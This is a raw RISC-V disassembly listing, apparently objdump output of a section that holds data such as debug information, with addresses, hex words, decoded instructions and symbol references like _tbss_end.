    1104:	68000003          	lb	zero,1664(zero) # 680 <_tbss_end+0x5fc>
    1108:	5f11                	li	t5,-28
    110a:	7275                	lui	tp,0xffffd
    110c:	0800                	addi	s0,sp,16
    110e:	07d5                	addi	a5,a5,21
    1110:	0049                	c.nop	18
    1112:	0000                	unimp
    1114:	0d70                	addi	a2,sp,668
    1116:	00e4                	addi	s1,sp,76
    1118:	0000                	unimp
    111a:	d808                	sw	a0,48(s0)
    111c:	9411                	srai	s0,s0,0x24
    111e:	0006                	c.slli	zero,0x1
    1120:	7400                	ld	s0,40(s0)
    1122:	5a0d                	li	s4,-29
    1124:	0005                	c.nop	1
    1126:	0800                	addi	s0,sp,16
    1128:	11d9                	addi	gp,gp,-10
    112a:	06a4                	addi	s1,sp,840
    112c:	0000                	unimp
    112e:	6c5f1177          	0x6c5f1177
    1132:	0062                	c.slli	zero,0x18
    1134:	dc08                	sw	a0,56(s0)
    1136:	3111                	addiw	sp,sp,-28
    1138:	78000003          	lb	zero,1920(zero) # 780 <_tbss_end+0x6fc>
    113c:	450d                	li	a0,3
    113e:	0001                	nop
    1140:	0800                	addi	s0,sp,16
    1142:	07df 0049 0000      	0x4907df
    1148:	0d88                	addi	a0,sp,720
    114a:	0156                	slli	sp,sp,0x15
    114c:	0000                	unimp
    114e:	e008                	sd	a0,0(s0)
    1150:	d50a                	sw	sp,168(sp)
    1152:	0000                	unimp
    1154:	9000                	0x9000
    1156:	1b0d                	addi	s6,s6,-29
    1158:	0006                	c.slli	zero,0x1
    115a:	0800                	addi	s0,sp,16
    115c:	04c012e3          	bne	zero,a2,19a0 <_tbss_end+0x191c>
    1160:	0000                	unimp
    1162:	0d98                	addi	a4,sp,720
    1164:	0271                	addi	tp,tp,28
    1166:	0000                	unimp
    1168:	e708                	sd	a0,8(a4)
    116a:	7b0c                	ld	a1,48(a4)
    116c:	0001                	nop
    116e:	a000                	fsd	fs0,0(s0)
    1170:	eb0d                	bnez	a4,11a2 <_tbss_end+0x111e>
    1172:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1176:	0ee9                	addi	t4,t4,26
    1178:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
    117c:	0da4                	addi	s1,sp,728
    117e:	00000277          	0x277
    1182:	ea08                	sd	a0,16(a2)
    1184:	4909                	li	s2,2
    1186:	0000                	unimp
    1188:	ac00                	fsd	fs0,24(s0)
    118a:	1600                	addi	s0,sp,800
    118c:	00ed                	addi	ra,ra,27
    118e:	0000                	unimp
    1190:	04c0                	addi	s0,sp,580
    1192:	0000                	unimp
    1194:	0004c017          	auipc	zero,0x4c
    1198:	1700                	addi	s0,sp,928
    119a:	0000015b          	0x15b
    119e:	00061417          	auipc	s0,0x61
    11a2:	1700                	addi	s0,sp,928
    11a4:	0049                	c.nop	18
    11a6:	0000                	unimp
    11a8:	1200                	addi	s0,sp,288
    11aa:	cb08                	sw	a0,16(a4)
    11ac:	0004                	0x4
    11ae:	0500                	addi	s0,sp,640
    11b0:	04c0                	addi	s0,sp,580
    11b2:	0000                	unimp
    11b4:	4918                	lw	a4,16(a0)
    11b6:	0004                	0x4
    11b8:	4800                	lw	s0,16(s0)
    11ba:	02650807          	0x2650807
    11be:	1408                	addi	a0,sp,544
    11c0:	0006                	c.slli	zero,0x1
    11c2:	1900                	addi	s0,sp,176
    11c4:	03a9                	addi	t2,t2,10
    11c6:	0000                	unimp
    11c8:	6708                	ld	a0,8(a4)
    11ca:	0702                	slli	a4,a4,0x0
    11cc:	0049                	c.nop	18
    11ce:	0000                	unimp
    11d0:	1900                	addi	s0,sp,176
    11d2:	0132                	slli	sp,sp,0xc
    11d4:	0000                	unimp
    11d6:	6c08                	ld	a0,24(s0)
    11d8:	0b02                	slli	s6,s6,0x0
    11da:	0700                	addi	s0,sp,896
    11dc:	0000                	unimp
    11de:	1908                	addi	a0,sp,176
    11e0:	000001f7          	0x1f7
    11e4:	6c08                	ld	a0,24(s0)
    11e6:	1402                	slli	s0,s0,0x20
    11e8:	0700                	addi	s0,sp,896
    11ea:	0000                	unimp
    11ec:	1910                	addi	a2,sp,176
    11ee:	01b0                	addi	a2,sp,200
    11f0:	0000                	unimp
    11f2:	6c08                	ld	a0,24(s0)
    11f4:	1e02                	slli	t3,t3,0x20
    11f6:	0700                	addi	s0,sp,896
    11f8:	0000                	unimp
    11fa:	1918                	addi	a4,sp,176
    11fc:	040c                	addi	a1,sp,512
    11fe:	0000                	unimp
    1200:	6e08                	ld	a0,24(a2)
    1202:	0802                	slli	a6,a6,0x0
    1204:	0049                	c.nop	18
    1206:	0000                	unimp
    1208:	1920                	addi	s0,sp,184
    120a:	001d                	c.nop	7
    120c:	0000                	unimp
    120e:	6f08                	ld	a0,24(a4)
    1210:	0802                	slli	a6,a6,0x0
    1212:	0909                	addi	s2,s2,2
    1214:	0000                	unimp
    1216:	1924                	addi	s1,sp,184
    1218:	0428                	addi	a0,sp,520
    121a:	0000                	unimp
    121c:	7208                	ld	a0,32(a2)
    121e:	0702                	slli	a4,a4,0x0
    1220:	0049                	c.nop	18
    1222:	0000                	unimp
    1224:	1940                	addi	s0,sp,180
    1226:	0416                	slli	s0,s0,0x5
    1228:	0000                	unimp
    122a:	7308                	ld	a0,32(a4)
    122c:	1602                	slli	a2,a2,0x20
    122e:	091e                	slli	s2,s2,0x7
    1230:	0000                	unimp
    1232:	1948                	addi	a0,sp,180
    1234:	0000033b          	addw	t1,zero,zero
    1238:	7508                	ld	a0,40(a0)
    123a:	0702                	slli	a4,a4,0x0
    123c:	0049                	c.nop	18
    123e:	0000                	unimp
    1240:	1950                	addi	a2,sp,180
    1242:	041e                	slli	s0,s0,0x7
    1244:	0000                	unimp
    1246:	7708                	ld	a0,40(a4)
    1248:	0a02                	slli	s4,s4,0x0
    124a:	0000092f          	0x92f
    124e:	1958                	addi	a4,sp,180
    1250:	025c                	addi	a5,sp,260
    1252:	0000                	unimp
    1254:	7a08                	ld	a0,48(a2)
    1256:	1302                	slli	t1,t1,0x20
    1258:	01e1                	addi	gp,gp,24
    125a:	0000                	unimp
    125c:	1960                	addi	s0,sp,188
    125e:	01d5                	addi	gp,gp,21
    1260:	0000                	unimp
    1262:	7b08                	ld	a0,48(a4)
    1264:	0702                	slli	a4,a4,0x0
    1266:	0049                	c.nop	18
    1268:	0000                	unimp
    126a:	1968                	addi	a0,sp,188
    126c:	05aa                	slli	a1,a1,0xa
    126e:	0000                	unimp
    1270:	7c08                	ld	a0,56(s0)
    1272:	1302                	slli	t1,t1,0x20
    1274:	01e1                	addi	gp,gp,24
    1276:	0000                	unimp
    1278:	1970                	addi	a2,sp,188
    127a:	0362                	slli	t1,t1,0x18
    127c:	0000                	unimp
    127e:	7d08                	ld	a0,56(a0)
    1280:	1402                	slli	s0,s0,0x20
    1282:	0935                	addi	s2,s2,13
    1284:	0000                	unimp
    1286:	1978                	addi	a4,sp,188
    1288:	01ff                	0x1ff
    128a:	0000                	unimp
    128c:	8008                	0x8008
    128e:	0702                	slli	a4,a4,0x0
    1290:	0049                	c.nop	18
    1292:	0000                	unimp
    1294:	1980                	addi	s0,sp,240
    1296:	014e                	slli	sp,sp,0x13
    1298:	0000                	unimp
    129a:	8108                	0x8108
    129c:	0902                	slli	s2,s2,0x0
    129e:	0614                	addi	a3,sp,768
    12a0:	0000                	unimp
    12a2:	1988                	addi	a0,sp,240
    12a4:	03a2                	slli	t2,t2,0x8
    12a6:	0000                	unimp
    12a8:	a408                	fsd	fa0,8(s0)
    12aa:	0702                	slli	a4,a4,0x0
    12ac:	000008e3          	beqz	zero,1abc <_tbss_end+0x1a38>
    12b0:	1a90                	addi	a2,sp,368
    12b2:	00000333          	add	t1,zero,zero
    12b6:	a808                	fsd	fa0,16(s0)
    12b8:	1302                	slli	t1,t1,0x20
    12ba:	0314                	addi	a3,sp,384
    12bc:	0000                	unimp
    12be:	01f8                	addi	a4,sp,204
    12c0:	2f1a                	fld	ft10,384(sp)
    12c2:	0002                	c.slli	zero,0x0
    12c4:	0800                	addi	s0,sp,16
    12c6:	02a9                	addi	t0,t0,10
    12c8:	d012                	sw	tp,32(sp)
    12ca:	0002                	c.slli	zero,0x0
    12cc:	0000                	unimp
    12ce:	1a02                	slli	s4,s4,0x20
    12d0:	0550                	addi	a2,sp,644
    12d2:	0000                	unimp
    12d4:	ad08                	fsd	fa0,24(a0)
    12d6:	0c02                	slli	s8,s8,0x0
    12d8:	0946                	slli	s2,s2,0x11
    12da:	0000                	unimp
    12dc:	0518                	addi	a4,sp,640
    12de:	1b1a                	slli	s6,s6,0x26
    12e0:	0001                	nop
    12e2:	0800                	addi	s0,sp,16
    12e4:	02b2                	slli	t0,t0,0xc
    12e6:	c110                	sw	a2,0(a0)
    12e8:	0006                	c.slli	zero,0x1
    12ea:	2000                	fld	fs0,0(s0)
    12ec:	1a05                	addi	s4,s4,-31
    12ee:	0100                	addi	s0,sp,128
    12f0:	0000                	unimp
    12f2:	b408                	fsd	fa0,40(s0)
    12f4:	0a02                	slli	s4,s4,0x0
    12f6:	0952                	slli	s2,s2,0x14
    12f8:	0000                	unimp
    12fa:	0538                	addi	a4,sp,648
    12fc:	1200                	addi	s0,sp,288
    12fe:	1a08                	addi	a0,sp,304
    1300:	0006                	c.slli	zero,0x1
    1302:	0200                	addi	s0,sp,256
    1304:	0801                	addi	a6,a6,0
    1306:	0394                	addi	a3,sp,448
    1308:	0000                	unimp
    130a:	1a05                	addi	s4,s4,-31
    130c:	0006                	c.slli	zero,0x1
    130e:	1200                	addi	s0,sp,288
    1310:	a208                	fsd	fa0,0(a2)
    1312:	0004                	0x4
    1314:	1600                	addi	s0,sp,800
    1316:	00ed                	addi	ra,ra,27
    1318:	0000                	unimp
    131a:	064a                	slli	a2,a2,0x12
    131c:	0000                	unimp
    131e:	0004c017          	auipc	zero,0x4c
    1322:	1700                	addi	s0,sp,928
    1324:	0000015b          	0x15b
    1328:	00064a17          	auipc	s4,0x64
    132c:	1700                	addi	s0,sp,928
    132e:	0049                	c.nop	18
    1330:	0000                	unimp
    1332:	1200                	addi	s0,sp,288
    1334:	2108                	fld	fa0,0(a0)
    1336:	0006                	c.slli	zero,0x1
    1338:	1200                	addi	s0,sp,288
    133a:	2c08                	fld	fa0,24(s0)
    133c:	0006                	c.slli	zero,0x1
    133e:	1600                	addi	s0,sp,800
    1340:	00e1                	addi	ra,ra,24
    1342:	0000                	unimp
    1344:	0674                	addi	a3,sp,780
    1346:	0000                	unimp
    1348:	0004c017          	auipc	zero,0x4c
    134c:	1700                	addi	s0,sp,928
    134e:	0000015b          	0x15b
    1352:	0000e117          	auipc	sp,0xe
    1356:	1700                	addi	s0,sp,928
    1358:	0049                	c.nop	18
    135a:	0000                	unimp
    135c:	1200                	addi	s0,sp,288
    135e:	5608                	lw	a0,40(a2)
    1360:	0006                	c.slli	zero,0x1
    1362:	1600                	addi	s0,sp,800
    1364:	0049                	c.nop	18
    1366:	0000                	unimp
    1368:	068e                	slli	a3,a3,0x3
    136a:	0000                	unimp
    136c:	0004c017          	auipc	zero,0x4c
    1370:	1700                	addi	s0,sp,928
    1372:	0000015b          	0x15b
    1376:	1200                	addi	s0,sp,288
    1378:	7a08                	ld	a0,48(a2)
    137a:	0006                	c.slli	zero,0x1
    137c:	0a00                	addi	s0,sp,272
    137e:	0034                	addi	a3,sp,8
    1380:	0000                	unimp
    1382:	06a4                	addi	s1,sp,840
    1384:	0000                	unimp
    1386:	0000790b          	0x790b
    138a:	0200                	addi	s0,sp,256
    138c:	0a00                	addi	s0,sp,272
    138e:	0034                	addi	a3,sp,8
    1390:	0000                	unimp
    1392:	06b4                	addi	a3,sp,840
    1394:	0000                	unimp
    1396:	0000790b          	0x790b
    139a:	0000                	unimp
    139c:	0700                	addi	s0,sp,896
    139e:	03d1                	addi	t2,t2,20
    13a0:	0000                	unimp
    13a2:	2408                	fld	fa0,8(s0)
    13a4:	1a01                	addi	s4,s4,-32
    13a6:	035f 0000 371b      	0x371b0000035f
    13ac:	0005                	c.nop	1
    13ae:	1800                	addi	s0,sp,48
    13b0:	2808                	fld	fa0,16(s0)
    13b2:	0801                	addi	a6,a6,0
    13b4:	06fa                	slli	a3,a3,0x1e
    13b6:	0000                	unimp
    13b8:	f919                	bnez	a0,12ce <_tbss_end+0x124a>
    13ba:	08000003          	lb	zero,128(zero) # 4d3ec <_tbss_end+0x4d368>
    13be:	012a                	slli	sp,sp,0xa
    13c0:	fa11                	bnez	a2,12d4 <_tbss_end+0x1250>
    13c2:	0006                	c.slli	zero,0x1
    13c4:	0000                	unimp
    13c6:	1519                	addi	a0,a0,-26
    13c8:	0002                	c.slli	zero,0x0
    13ca:	0800                	addi	s0,sp,16
    13cc:	4907012b          	0x4907012b
    13d0:	0000                	unimp
    13d2:	0800                	addi	s0,sp,16
    13d4:	cb19                	beqz	a4,13ea <_tbss_end+0x1366>
    13d6:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    13da:	012c                	addi	a1,sp,136
    13dc:	0007000b          	0x7000b
    13e0:	1000                	addi	s0,sp,32
    13e2:	1200                	addi	s0,sp,288
    13e4:	c108                	sw	a0,0(a0)
    13e6:	0006                	c.slli	zero,0x1
    13e8:	1200                	addi	s0,sp,288
    13ea:	b408                	fsd	fa0,40(s0)
    13ec:	0006                	c.slli	zero,0x1
    13ee:	1b00                	addi	s0,sp,432
    13f0:	0015                	c.nop	5
    13f2:	0000                	unimp
    13f4:	080e                	slli	a6,a6,0x3
    13f6:	0144                	addi	s1,sp,132
    13f8:	3f08                	fld	fa0,56(a4)
    13fa:	19000007          	0x19000007
    13fe:	0450                	addi	a2,sp,516
    1400:	0000                	unimp
    1402:	4508                	lw	a0,8(a0)
    1404:	1201                	addi	tp,tp,-32
    1406:	0000073f 04c71900 	0x4c719000000073f
    140e:	0000                	unimp
    1410:	4608                	lw	a0,8(a2)
    1412:	1201                	addi	tp,tp,-32
    1414:	0000073f 04e31906 	0x4e319060000073f
    141c:	0000                	unimp
    141e:	4708                	lw	a0,8(a4)
    1420:	1201                	addi	tp,tp,-32
    1422:	0042                	c.slli	zero,0x10
    1424:	0000                	unimp
    1426:	000c                	0xc
    1428:	420a                	lw	tp,128(sp)
    142a:	0000                	unimp
    142c:	4f00                	lw	s0,24(a4)
    142e:	0b000007          	0xb000007
    1432:	0079                	c.nop	30
    1434:	0000                	unimp
    1436:	0002                	c.slli	zero,0x0
    1438:	d81c                	sw	a5,48(s0)
    143a:	8508                	0x8508
    143c:	0702                	slli	a4,a4,0x0
    143e:	0864                	addi	s1,sp,28
    1440:	0000                	unimp
    1442:	1b19                	addi	s6,s6,-26
    1444:	0005                	c.nop	1
    1446:	0800                	addi	s0,sp,16
    1448:	5f180287          	0x5f180287
    144c:	0000                	unimp
    144e:	0000                	unimp
    1450:	cd19                	beqz	a0,146e <_tbss_end+0x13ea>
    1452:	0004                	0x4
    1454:	0800                	addi	s0,sp,16
    1456:	0288                	addi	a0,sp,320
    1458:	1412                	slli	s0,s0,0x24
    145a:	0006                	c.slli	zero,0x1
    145c:	0800                	addi	s0,sp,16
    145e:	4f19                	li	t5,6
    1460:	0002                	c.slli	zero,0x0
    1462:	0800                	addi	s0,sp,16
    1464:	0289                	addi	t0,t0,2
    1466:	6410                	ld	a2,8(s0)
    1468:	0008                	0x8
    146a:	1000                	addi	s0,sp,32
    146c:	7319                	lui	t1,0xfffe6
    146e:	0005                	c.nop	1
    1470:	0800                	addi	s0,sp,16
    1472:	028a                	slli	t0,t0,0x2
    1474:	0001f717          	auipc	a4,0x1f
    1478:	2c00                	fld	fs0,24(s0)
    147a:	c019                	beqz	s0,1480 <_tbss_end+0x13fc>
    147c:	0001                	nop
    147e:	0800                	addi	s0,sp,16
    1480:	490f028b          	0x490f028b
    1484:	0000                	unimp
    1486:	5000                	lw	s0,32(s0)
    1488:	f419                	bnez	s0,1396 <_tbss_end+0x1312>
    148a:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    148e:	028c                	addi	a1,sp,320
    1490:	742c                	ld	a1,104(s0)
    1492:	0008                	0x8
    1494:	5800                	lw	s0,48(s0)
    1496:	8919                	andi	a0,a0,6
    1498:	0005                	c.nop	1
    149a:	0800                	addi	s0,sp,16
    149c:	028d                	addi	t0,t0,3
    149e:	061a                	slli	a2,a2,0x6
    14a0:	60000007          	0x60000007
    14a4:	ff19                	bnez	a4,13c2 <_tbss_end+0x133e>
    14a6:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    14aa:	028e                	slli	t0,t0,0x3
    14ac:	4f16                	lw	t5,68(sp)
    14ae:	0001                	nop
    14b0:	7000                	ld	s0,32(s0)
    14b2:	9419                	srai	s0,s0,0x26
    14b4:	0005                	c.nop	1
    14b6:	0800                	addi	s0,sp,16
    14b8:	4f16028f          	0x4f16028f
    14bc:	0001                	nop
    14be:	7800                	ld	s0,48(s0)
    14c0:	b519                	j	12c6 <_tbss_end+0x1242>
    14c2:	0000                	unimp
    14c4:	0800                	addi	s0,sp,16
    14c6:	0290                	addi	a2,sp,320
    14c8:	4f16                	lw	t5,68(sp)
    14ca:	0001                	nop
    14cc:	8000                	0x8000
    14ce:	4619                	li	a2,6
    14d0:	0005                	c.nop	1
    14d2:	0800                	addi	s0,sp,16
    14d4:	0291                	addi	t0,t0,4
    14d6:	7b10                	ld	a2,48(a4)
    14d8:	0008                	0x8
    14da:	8800                	0x8800
    14dc:	4319                	li	t1,6
    14de:	0002                	c.slli	zero,0x0
    14e0:	0800                	addi	s0,sp,16
    14e2:	0292                	slli	t0,t0,0x4
    14e4:	8b10                	0x8b10
    14e6:	0008                	0x8
    14e8:	9000                	0x9000
    14ea:	f019                	bnez	s0,13f0 <_tbss_end+0x136c>
    14ec:	0004                	0x4
    14ee:	0800                	addi	s0,sp,16
    14f0:	490f0293          	addi	t0,t5,1168 # fffffffffffe3490 <_end+0xffffffff7ffc8210>
    14f4:	0000                	unimp
    14f6:	a800                	fsd	fs0,16(s0)
    14f8:	6f19                	lui	t5,0x6
    14fa:	0001                	nop
    14fc:	0800                	addi	s0,sp,16
    14fe:	0294                	addi	a3,sp,320
    1500:	4f16                	lw	t5,68(sp)
    1502:	0001                	nop
    1504:	ac00                	fsd	fs0,24(s0)
    1506:	a619                	j	180c <_tbss_end+0x1788>
    1508:	0000                	unimp
    150a:	0800                	addi	s0,sp,16
    150c:	0295                	addi	t0,t0,5
    150e:	4f16                	lw	t5,68(sp)
    1510:	0001                	nop
    1512:	b400                	fsd	fs0,40(s0)
    1514:	5e19                	li	t3,-26
    1516:	0001                	nop
    1518:	0800                	addi	s0,sp,16
    151a:	0296                	slli	t0,t0,0x5
    151c:	4f16                	lw	t5,68(sp)
    151e:	0001                	nop
    1520:	bc00                	fsd	fs0,56(s0)
    1522:	3c19                	addiw	s8,s8,-26
    1524:	0000                	unimp
    1526:	0800                	addi	s0,sp,16
    1528:	4f160297          	auipc	t0,0x4f160
    152c:	0001                	nop
    152e:	c400                	sw	s0,8(s0)
    1530:	4b19                	li	s6,6
    1532:	0000                	unimp
    1534:	0800                	addi	s0,sp,16
    1536:	0298                	addi	a4,sp,320
    1538:	4f16                	lw	t5,68(sp)
    153a:	0001                	nop
    153c:	cc00                	sw	s0,24(s0)
    153e:	a719                	j	1c44 <_tbss_end+0x1bc0>
    1540:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
    1544:	0299                	addi	t0,t0,6
    1546:	4908                	lw	a0,16(a0)
    1548:	0000                	unimp
    154a:	d400                	sw	s0,40(s0)
    154c:	0a00                	addi	s0,sp,272
    154e:	061a                	slli	a2,a2,0x6
    1550:	0000                	unimp
    1552:	0874                	addi	a3,sp,28
    1554:	0000                	unimp
    1556:	0000790b          	0x790b
    155a:	1900                	addi	s0,sp,176
    155c:	0200                	addi	s0,sp,256
    155e:	0708                	addi	a0,sp,896
    1560:	005c                	addi	a5,sp,4
    1562:	0000                	unimp
    1564:	1a0a                	slli	s4,s4,0x22
    1566:	0006                	c.slli	zero,0x1
    1568:	8b00                	0x8b00
    156a:	0008                	0x8
    156c:	0b00                	addi	s0,sp,400
    156e:	0079                	c.nop	30
    1570:	0000                	unimp
    1572:	1a0a0007          	0x1a0a0007
    1576:	0006                	c.slli	zero,0x1
    1578:	9b00                	0x9b00
    157a:	0008                	0x8
    157c:	0b00                	addi	s0,sp,400
    157e:	0079                	c.nop	30
    1580:	0000                	unimp
    1582:	681d0017          	auipc	zero,0x681d0
    1586:	0801                	addi	a6,a6,0
    1588:	029e                	slli	t0,t0,0x7
    158a:	0008c307          	flq	ft6,0(a7) # 4000 <_tbss_end+0x3f7c>
    158e:	1900                	addi	s0,sp,176
    1590:	0316                	slli	t1,t1,0x5
    1592:	0000                	unimp
    1594:	a108                	fsd	fa0,0(a0)
    1596:	1b02                	slli	s6,s6,0x20
    1598:	000008c3          	fmadd.s	fa7,ft0,ft0,ft0,rne
    159c:	1900                	addi	s0,sp,176
    159e:	000002f7          	0x2f7
    15a2:	a208                	fsd	fa0,0(a2)
    15a4:	1802                	slli	a6,a6,0x20
    15a6:	000008d3          	fadd.s	fa7,ft0,ft0,rne
    15aa:	00f0                	addi	a2,sp,76
    15ac:	590a                	lw	s2,160(sp)
    15ae:	d3000003          	lb	zero,-720(zero) # 681d12b2 <_tbss_end+0x681d122e>
    15b2:	0008                	0x8
    15b4:	0b00                	addi	s0,sp,400
    15b6:	0079                	c.nop	30
    15b8:	0000                	unimp
    15ba:	001d                	c.nop	7
    15bc:	5f0a                	lw	t5,160(sp)
    15be:	0000                	unimp
    15c0:	e300                	sd	s0,0(a4)
    15c2:	0008                	0x8
    15c4:	0b00                	addi	s0,sp,400
    15c6:	0079                	c.nop	30
    15c8:	0000                	unimp
    15ca:	001d                	c.nop	7
    15cc:	681e                	ld	a6,448(sp)
    15ce:	0801                	addi	a6,a6,0
    15d0:	09030283          	lb	t0,144(t1) # fffffffffffe6090 <_end+0xffffffff7ffcae10>
    15d4:	0009                	c.nop	2
    15d6:	1f00                	addi	s0,sp,944
    15d8:	0449                	addi	s0,s0,18
    15da:	0000                	unimp
    15dc:	9a08                	0x9a08
    15de:	0b02                	slli	s6,s6,0x0
    15e0:	0000074f          	fnmadd.s	fa4,ft0,ft0,ft0,rne
    15e4:	601f 0005 0800      	0x8000005601f
    15ea:	9b0b02a3          	sb	a6,-1627(s6) # 4909a5 <_tbss_end+0x490921>
    15ee:	0008                	0x8
    15f0:	0000                	unimp
    15f2:	1a0a                	slli	s4,s4,0x22
    15f4:	0006                	c.slli	zero,0x1
    15f6:	1900                	addi	s0,sp,176
    15f8:	0009                	c.nop	2
    15fa:	0b00                	addi	s0,sp,400
    15fc:	0079                	c.nop	30
    15fe:	0000                	unimp
    1600:	0018                	0x18
    1602:	9220                	0x9220
    1604:	0000                	unimp
    1606:	1200                	addi	s0,sp,288
    1608:	1908                	addi	a0,sp,176
    160a:	0009                	c.nop	2
    160c:	2100                	fld	fs0,0(a0)
    160e:	0000092f          	0x92f
    1612:	0004c017          	auipc	zero,0x4c
    1616:	0000                	unimp
    1618:	0812                	slli	a6,a6,0x4
    161a:	0924                	addi	s1,sp,152
    161c:	0000                	unimp
    161e:	0812                	slli	a6,a6,0x4
    1620:	01e1                	addi	gp,gp,24
    1622:	0000                	unimp
    1624:	4621                	li	a2,8
    1626:	0009                	c.nop	2
    1628:	1700                	addi	s0,sp,928
    162a:	0049                	c.nop	18
    162c:	0000                	unimp
    162e:	1200                	addi	s0,sp,288
    1630:	4c08                	lw	a0,24(s0)
    1632:	0009                	c.nop	2
    1634:	1200                	addi	s0,sp,288
    1636:	3b08                	fld	fa0,48(a4)
    1638:	0009                	c.nop	2
    163a:	0a00                	addi	s0,sp,272
    163c:	06b4                	addi	a3,sp,840
    163e:	0000                	unimp
    1640:	0962                	slli	s2,s2,0x18
    1642:	0000                	unimp
    1644:	0000790b          	0x790b
    1648:	0200                	addi	s0,sp,256
    164a:	2200                	fld	fs0,0(a2)
    164c:	0504                	addi	s1,sp,640
    164e:	0000                	unimp
    1650:	3308                	fld	fa0,32(a4)
    1652:	04c01703          	lh	a4,76(zero) # 4d65e <_tbss_end+0x4d5da>
    1656:	0000                	unimp
    1658:	fd22                	sd	s0,184(sp)
    165a:	0004                	0x4
    165c:	0800                	addi	s0,sp,16
    165e:	0334                	addi	a3,sp,392
    1660:	c61d                	beqz	a2,168e <_tbss_end+0x160a>
    1662:	0004                	0x4
    1664:	0600                	addi	s0,sp,768
    1666:	06c5                	addi	a3,a3,17
    1668:	0000                	unimp
    166a:	280a                	fld	fa6,128(sp)
    166c:	00015d1b          	srliw	s10,sp,0x0
    1670:	0600                	addi	s0,sp,768
    1672:	06cc                	addi	a1,sp,836
    1674:	0000                	unimp
    1676:	630a                	ld	t1,128(sp)
    1678:	7c18                	ld	a4,56(s0)
    167a:	0009                	c.nop	2
    167c:	2300                	fld	fs0,0(a4)
    167e:	08a0                	addi	s0,sp,88
    1680:	0000                	unimp
    1682:	0f02                	slli	t5,t5,0x0
    1684:	981a                	add	a6,a6,t1
    1686:	0000                	unimp
    1688:	2300                	fld	fs0,0(a4)
    168a:	08f4                	addi	a3,sp,92
    168c:	0000                	unimp
    168e:	1002                	c.slli	zero,0x20
    1690:	981a                	add	a6,a6,t1
    1692:	0000                	unimp
    1694:	0a00                	addi	s0,sp,272
    1696:	009d                	addi	ra,ra,7
    1698:	0000                	unimp
    169a:	09bc                	addi	a5,sp,216
    169c:	0000                	unimp
    169e:	0000790b          	0x790b
    16a2:	0100                	addi	s0,sp,128
    16a4:	2400                	fld	fs0,8(s0)
    16a6:	000006f3          	0x6f3
    16aa:	2502                	fld	fa0,0(sp)
    16ac:	ac12                	fsd	ft4,24(sp)
    16ae:	0009                	c.nop	2
    16b0:	0900                	addi	s0,sp,144
    16b2:	01b24003          	lbu	zero,27(tp) # ffffffffffffd01b <_end+0xffffffff7ffe1d9b>
    16b6:	0080                	addi	s0,sp,64
    16b8:	0000                	unimp
    16ba:	0a00                	addi	s0,sp,272
    16bc:	0614                	addi	a3,sp,768
    16be:	0000                	unimp
    16c0:	09e2                	slli	s3,s3,0x18
    16c2:	0000                	unimp
    16c4:	0000790b          	0x790b
    16c8:	0100                	addi	s0,sp,128
    16ca:	2400                	fld	fs0,8(s0)
    16cc:	0812                	slli	a6,a6,0x4
    16ce:	0000                	unimp
    16d0:	2602                	fld	fa2,0(sp)
    16d2:	d20e                	sw	gp,36(sp)
    16d4:	0009                	c.nop	2
    16d6:	0900                	addi	s0,sp,144
    16d8:	01b25003          	lhu	zero,27(tp) # 1b <_tdata_begin+0x1b>
    16dc:	0080                	addi	s0,sp,64
    16de:	0000                	unimp
    16e0:	2500                	fld	fs0,8(a0)
    16e2:	0916                	slli	s2,s2,0x5
    16e4:	0000                	unimp
    16e6:	c302                	sw	zero,132(sp)
    16e8:	0601                	addi	a2,a2,0
    16ea:	0066                	c.slli	zero,0x19
    16ec:	0000                	unimp
    16ee:	2642                	fld	fa2,16(sp)
    16f0:	8000                	0x8000
    16f2:	0000                	unimp
    16f4:	0000                	unimp
    16f6:	00dc                	addi	a5,sp,68
    16f8:	0000                	unimp
    16fa:	0000                	unimp
    16fc:	0000                	unimp
    16fe:	9c01                	subw	s0,s0,s0
    1700:	0a4c                	addi	a1,sp,276
    1702:	0000                	unimp
    1704:	7326                	ld	t1,104(sp)
    1706:	7274                	ld	a3,224(a2)
    1708:	0200                	addi	s0,sp,256
    170a:	4a1701c3          	fmadd.d	ft3,fa4,ft1,fs1,rne
    170e:	0006                	c.slli	zero,0x1
    1710:	0200                	addi	s0,sp,256
    1712:	5891                	li	a7,-28
    1714:	73657227          	0x73657227
    1718:	0200                	addi	s0,sp,256
    171a:	01c5                	addi	gp,gp,17
    171c:	6608                	ld	a0,8(a2)
    171e:	0000                	unimp
    1720:	0200                	addi	s0,sp,256
    1722:	6891                	lui	a7,0x4
    1724:	9c28                	0x9c28
    1726:	0001                	nop
    1728:	0200                	addi	s0,sp,256
    172a:	01c6                	slli	gp,gp,0x11
    172c:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1730:	0200                	addi	s0,sp,256
    1732:	6491                	lui	s1,0x4
    1734:	2900                	fld	fs0,16(a0)
    1736:	06a8                	addi	a0,sp,840
    1738:	0000                	unimp
    173a:	1408260b          	0x1408260b
    173e:	0006                	c.slli	zero,0x1
    1740:	f800                	sd	s0,48(s0)
    1742:	0025                	c.nop	9
    1744:	0080                	addi	s0,sp,64
    1746:	0000                	unimp
    1748:	4a00                	lw	s0,16(a2)
    174a:	0000                	unimp
    174c:	0000                	unimp
    174e:	0000                	unimp
    1750:	0100                	addi	s0,sp,128
    1752:	9d9c                	0x9d9c
    1754:	000a                	c.slli	zero,0x2
    1756:	2a00                	fld	fs0,16(a2)
    1758:	0934                	addi	a3,sp,152
    175a:	0000                	unimp
    175c:	bb02                	fsd	ft0,432(sp)
    175e:	1401                	addi	s0,s0,-32
    1760:	0614                	addi	a3,sp,768
    1762:	0000                	unimp
    1764:	9102                	jalr	sp
    1766:	2658                	fld	fa4,136(a2)
    1768:	00637273          	csrrci	tp,0x6,6
    176c:	bb02                	fsd	ft0,432(sp)
    176e:	2601                	sext.w	a2,a2
    1770:	064a                	slli	a2,a2,0x12
    1772:	0000                	unimp
    1774:	9102                	jalr	sp
    1776:	2750                	fld	fa2,136(a4)
    1778:	0064                	addi	s1,sp,12
    177a:	bd02                	fsd	ft0,184(sp)
    177c:	0901                	addi	s2,s2,0
    177e:	0614                	addi	a3,sp,768
    1780:	0000                	unimp
    1782:	9102                	jalr	sp
    1784:	0068                	addi	a0,sp,12
    1786:	4729                	li	a4,10
    1788:	0b000007          	0xb000007
    178c:	0624                	addi	s1,sp,776
